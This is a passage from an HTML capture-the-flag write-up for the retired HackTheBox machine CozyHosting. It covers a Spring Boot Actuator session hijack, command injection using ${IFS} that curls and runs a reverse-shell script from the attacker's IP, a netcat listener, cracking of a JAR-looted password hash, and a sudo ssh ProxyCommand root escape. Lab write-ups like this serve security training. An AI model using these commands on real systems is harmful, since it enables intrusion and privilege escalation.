@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CozyHosting &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>CozyHosting</h1>
+    <div class="meta">Target: <code>10.10.14.143</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">SpringBoot</span><span class="tag">Actuator</span><span class="tag">CMDInjection</span><span class="tag">jarfiles</span><span class="tag">postgres</span><span class="tag">john</span><span class="tag">sudo</span><span class="tag">GTFOBins</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#session-hijack-command-injection">Session Hijack → Command Injection</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#looting-the-jar-postgres-ssh">Looting the JAR → Postgres → SSH</a><a class="lvl3" href="#sudo-ssh-gtfobins">sudo ssh, GTFOBins</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>CozyHosting is an easy Linux box that's a tour of Spring Boot misconfigurations. An exposed <strong>Actuator</strong> endpoint leaks a live session, which I hijack to reach an admin dashboard. The dashboard's host field is vulnerable to <strong>command injection</strong>, giving a shell as <code>app</code>. From there I loot the application JAR for a Postgres password, crack an admin bcrypt hash, reuse it for SSH, and finish with a one-line <strong>GTFOBins</strong> <code>sudo ssh</code> escape.</p>
+<h2 id="recon">Recon</h2>
+<p>The <code>/error</code> page renders a Spring "Whitelabel Error Page", fingerprinting <strong>Spring Boot</strong>. That tells me to fuzz with a Spring-specific wordlist, which immediately exposed the Actuator:</p>
+<pre><code class="language-sh">gobuster dir -u http://cozyhosting.htb/ -w .../spring-boot.txt -x php,js,htm,html
+/actuator/sessions    (Status: 200)
+/actuator/env         (Status: 200)
+/actuator/mappings    (Status: 200)
+</code></pre>
+<blockquote>
+<p><strong>Why exposed Actuators are dangerous:</strong> Spring Boot Actuator endpoints are operational tooling, health, env, beans, and crucially <code>sessions</code>. Left public, <code>/actuator/sessions</code> lists active session IDs mapped to usernames. That's a free authentication bypass.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="session-hijack-command-injection">Session Hijack → Command Injection</h3>
+<p><code>/actuator/sessions</code> exposed a session token tied to <code>kanderson</code>. I set that cookie in the browser and refreshed straight into the admin dashboard.</p>
+<p>The dashboard runs an <code>ssh</code>-based connection check. The username field rejects spaces, but <code>${IFS}</code> (the shell's Internal Field Separator) substitutes for them, bypassing the filter:</p>
+<blockquote>
+<p><strong>Why <code>${IFS}</code> works:</strong> the app blocks literal spaces, but the backend still passes the field to a shell. <code>${IFS}</code> expands to whitespace <em>inside</em> the shell, so I reconstruct a multi-argument command without ever typing a space.</p>
+</blockquote>
+<pre><code class="language-sh">test;curl${IFS}http://10.10.14.143/rev.sh${IFS}-o${IFS}/tmp/rev.sh
+test;bash${IFS}/tmp/rev.sh
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+app@cozyhosting:/app$ whoami
+app
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="looting-the-jar-postgres-ssh">Looting the JAR → Postgres → SSH</h3>
+<p>The app directory held <code>cloudhosting-0.0.1.jar</code>. Unzipping it and grepping for secrets found the datasource password:</p>
+<pre><code class="language-sh">grep -R password .
+./BOOT-INF/classes/application.properties:spring.datasource.password=‹redacted›
+</code></pre>
+<p>Connecting to Postgres with it and dumping the <code>users</code> table gave an admin bcrypt hash, which John cracked:</p>
+<pre><code class="language-sql">select * from users;
+ admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+</code></pre>
+<pre><code class="language-sh">john hash --wordlist=rockyou.txt   -&gt;   ‹redacted›
+</code></pre>
+<p>The admin password didn't SSH as <code>admin</code>, but it <em>did</em> work for the only other real user, <code>josh</code>, password reuse again:</p>
+<pre><code class="language-sh">ssh josh@cozyhosting.htb
+josh@cozyhosting:~$ whoami
+josh
+</code></pre>
+<h3 id="sudo-ssh-gtfobins">sudo ssh, GTFOBins</h3>
+<pre><code class="language-sh">sudo -l
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *
+</code></pre>
+<blockquote>
+<p><strong>Why <code>sudo ssh</code> is root:</strong> OpenSSH's <code>ProxyCommand</code> runs an arbitrary command. When <code>ssh</code> itself runs as root via sudo, that command runs as root too. GTFOBins documents the exact escape:</p>
+</blockquote>
+<pre><code class="language-sh">sudo ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh"># whoami
+root
+</code></pre>
+<p>Box rooted.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Spring Boot Actuator endpoints belong behind auth.</strong> <code>/actuator/sessions</code> handed over a valid session.</li>
+<li><strong><code>${IFS}</code> defeats naive space filters</strong> in command-injection contexts.</li>
+<li><strong>Application JARs are credential stores.</strong> Unzip and <code>grep -R password</code>, <code>application.properties</code> routinely holds DB creds.</li>
+<li><strong><code>sudo</code> on <code>ssh</code> is a known GTFOBins root escape</strong> via <code>ProxyCommand</code>. Always check GTFOBins for any binary you can sudo.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
